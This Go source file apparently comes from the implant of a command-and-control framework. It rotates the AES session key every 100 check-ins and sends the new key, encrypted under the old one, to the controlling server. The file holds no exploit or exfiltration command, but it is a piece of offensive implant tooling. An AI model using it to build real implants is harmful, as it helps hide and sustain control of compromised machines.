package implant

import (
	"github.com/phantom-c2/phantom/internal/crypto"
)

// KeyRotation handles periodic re-keying of the AES session key.
// After N check-ins, the agent generates a new AES key, encrypts it
// with the current session key, and sends it to the server.
// This limits the window of exposure if a session key is compromised.

const rotateEveryN = 100 // Rotate key every 100 check-ins

// KeyRotator manages session key rotation.
type KeyRotator struct {
	currentKey  []byte
	checkInCount int
}

// NewKeyRotator creates a new key rotator.
func NewKeyRotator(initialKey []byte) *KeyRotator {
	return &KeyRotator{
		currentKey: initialKey,
	}
}

// ShouldRotate returns true if the key should be rotated.
func (kr *KeyRotator) ShouldRotate() bool {
	return kr.checkInCount > 0 && kr.checkInCount%rotateEveryN == 0
}

// Rotate generates a new session key, encrypts it with the current key.
// Returns the encrypted new key to send to the server.
func (kr *KeyRotator) Rotate() (newKey []byte, encryptedNewKey []byte, err error) {
	newKey, err = crypto.GenerateAESKey()
	if err != nil {
		return nil, nil, err
	}

	// Encrypt new key with current key so server can decrypt
	encryptedNewKey, err = crypto.AESEncrypt(kr.currentKey, newKey)
	if err != nil {
		return nil, nil, err
	}

	return newKey, encryptedNewKey, nil
}

// Apply sets the new key after server confirms rotation.
func (kr *KeyRotator) Apply(newKey []byte) {
	kr.currentKey = newKey
}

// Increment bumps the check-in counter.
func (kr *KeyRotator) Increment() {
	kr.checkInCount++
}

// CurrentKey returns the active session key.
func (kr *KeyRotator) CurrentKey() []byte {
	return kr.currentKey
}
